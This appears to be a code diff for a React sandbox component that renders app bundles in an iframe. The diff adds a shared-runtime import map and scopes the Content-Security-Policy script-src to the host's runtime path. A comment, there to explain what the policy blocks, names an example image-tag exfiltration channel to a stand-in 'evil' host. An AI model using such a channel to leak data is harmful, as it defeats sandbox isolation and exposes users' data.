@@ -19,6 +19,29 @@ type Status = 'loading' | 'ready' | 'nobuild' | 'error';
 /** Serialize every same-origin stylesheet the host has loaded (Tailwind output
  *  + theme vars). Cross-origin sheets throw on .cssRules — skipped. Cached: the
  *  app's CSS doesn't change within a session. */
+/** The shared-runtime import map (specifier → hashed `/app-runtime` URL),
+ *  fetched once per session. The app's bundle imports react/react-dom/the kit/
+ *  @host as BARE specifiers (the bundler marks them external); this map — injected
+ *  into the srcdoc — resolves them to the ONE shared runtime, so the browser
+ *  fetches + parses React once across every app + reload instead of each app
+ *  re-bundling it. manifest.json is public + same-origin (see middleware). */
+let importMapPromise: Promise<string> | null = null;
+function loadImportMap(): Promise<string> {
+  if (!importMapPromise) {
+    importMapPromise = fetch('/app-runtime/manifest.json')
+      .then((r) => {
+        if (!r.ok) throw new Error(`app-runtime manifest ${r.status}`);
+        return r.json() as Promise<{ imports: Record<string, string> }>;
+      })
+      .then((m) => JSON.stringify({ imports: m.imports }))
+      .catch((e) => {
+        importMapPromise = null; // let the next mount retry
+        throw e;
+      });
+  }
+  return importMapPromise;
+}
+
 let cssCache: string | null = null;
 function captureHostCss(): string {
   if (cssCache !== null) return cssCache;
@@ -108,7 +131,7 @@ const INSPECTOR = `
 })();
 `;
 
-function buildSrcDoc(bundleCode: string): string {
+function buildSrcDoc(bundleCode: string, importMapJson: string): string {
   const html = document.documentElement;
   const cls = html.className || '';
   const colorTheme = html.dataset.colorTheme ? ` data-color-theme="${html.dataset.colorTheme}"` : '';
@@ -119,14 +142,22 @@ function buildSrcDoc(bundleCode: string): string {
   // exfil channel (`<img src="https://evil/?d=…">`) despite connect-src 'none'.
   // The app's only egress is the postMessage bridge to the parent, which
   // brokers tool + sqlite calls server-side. Inline style + script are ours.
+  //
+  // `script-src` additionally allows ONLY `<origin>/app-runtime/` — the shared
+  // React/kit/host runtime the import map points at. The iframe has an opaque
+  // origin, so `'self'` matches NOTHING here; we name the host origin + path
+  // explicitly, scoped to the runtime dir so it's not a general egress channel.
+  const origin = location.origin;
   const csp =
-    "default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; " +
+    "default-src 'none'; style-src 'unsafe-inline'; " +
+    `script-src 'unsafe-inline' ${origin}/app-runtime/; ` +
     "img-src data: blob:; font-src data:; connect-src 'none'; base-uri 'none'; form-action 'none'";
   return `<!doctype html>
 <html class="${cls}"${colorTheme}>
 <head>
 <meta charset="utf-8" />
 <meta http-equiv="Content-Security-Policy" content="${csp}" />
+<script type="importmap">${importMapJson}</script>
 <style>${css}</style>
 <style>/* Paint the iframe canvas with the theme background, NOT transparent: a
    sandboxed (opaque-origin) iframe renders WHITE where it's transparent, so any
@@ -280,8 +311,8 @@ export function AppSandbox({
   useEffect(() => {
     let cancelled = false;
     setStatus('loading');
-    fetch(`/api/apps/${appId}/bundle`)
-      .then(async (r) => {
+    Promise.all([fetch(`/api/apps/${appId}/bundle`), loadImportMap()])
+      .then(async ([r, importMap]) => {
         if (cancelled) return;
         if (r.status === 404) {
           setStatus('nobuild');
@@ -294,7 +325,7 @@ export function AppSandbox({
         }
         const code = await r.text();
         if (cancelled || !iframeRef.current) return;
-        iframeRef.current.srcdoc = buildSrcDoc(code);
+        iframeRef.current.srcdoc = buildSrcDoc(code, importMap);
       })
       .catch((err) => {
         if (cancelled) return;
